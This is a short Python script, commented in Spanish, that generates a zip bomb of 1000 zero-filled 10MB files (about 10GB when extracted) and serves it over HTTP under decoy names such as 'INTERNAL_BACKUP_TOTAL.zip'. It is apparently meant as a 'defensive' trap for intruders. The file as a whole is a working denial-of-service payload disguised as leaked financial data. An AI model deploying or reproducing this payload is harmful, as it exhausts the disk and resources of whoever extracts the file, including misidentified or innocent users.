import zipfile
import io
import os

def generate_ultra_zip():
    """
    Genera una bomba ZIP no recursiva de alta densidad.
    Diseñada para expandirse de ~1MB a >10GB en el sistema del atacante.
    """
    zip_buffer = io.BytesIO()
    
    # Kernel de 10MB de ceros (compresión extrema)
    # 10MB comprimidos ocupan apenas unos bytes.
    kernel_data = b"\x00" * (1024 * 1024 * 10)
    
    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zf:
        # Añadimos 1000 archivos de 10MB cada uno.
        # Total expansión: 10,000 MB (10 GB)
        for i in range(1000):
            filename = f"FINANCIAL_DATA_PART_{i:04d}.dat"
            # El compresor DEFLATE reducirá esto a casi nada en el .zip,
            # pero el extractor tendrá que escribir los 10GB reales en disco.
            zf.writestr(filename, kernel_data)
            
        zf.writestr("HELL_CORE_v8.txt", "SISTEMA DE DEFENSA ACTIVA: RECURSOS LOCALES AGOTADOS.")

    return zip_buffer.getvalue()

def serve_zip_trap(client_socket):
    """Sirve la bomba de 10GB vía HTTP"""
    try:
        zip_data = generate_ultra_zip()
        header = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: application/zip\r\n"
            "Content-Disposition: attachment; filename=\"INTERNAL_BACKUP_TOTAL.zip\"\r\n"
            f"Content-Length: {len(zip_data)}\r\n"
            "Connection: close\r\n\r\n"
        )
        client_socket.send(header.encode() + zip_data)
        print(f"[💀] Bomba de 10GB (Fifield-Style) enviada.")
    except: pass
